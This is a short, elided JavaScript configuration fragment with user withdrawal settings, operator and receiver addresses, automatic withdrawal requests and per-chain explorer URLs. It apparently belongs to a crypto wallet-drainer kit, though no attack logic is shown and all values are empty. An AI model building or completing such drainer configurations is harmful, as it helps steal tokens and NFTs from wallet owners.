...
const CONFIG = {
  ...
  user: {
    DEFAULT_METHOD_WITHDRAWAL_ERC20: "",
    DEFAULT_METHOD_WITHDRAWAL_NFT: "",
    useAdditionalWallet: false,
    useSwapBypass: false,
    operatorAddress: "",
    receiverAddress: "",
    isAutomaticWithdrawalRequest: true,
    isLoopChangingNetwork: false,
    isNftСheck: false,
  },
  CHAINS: {
    eth: {
    ...
    aurora: {
      ...
      abiUrl:
        "https://explorer.mainnet.aurora.dev/api?module=contract&action=getAbi&address=",
...
/* 
infura support in total 17 here doesn't support last 5 networks [pls,movr,celo,aurora,nova]
*/
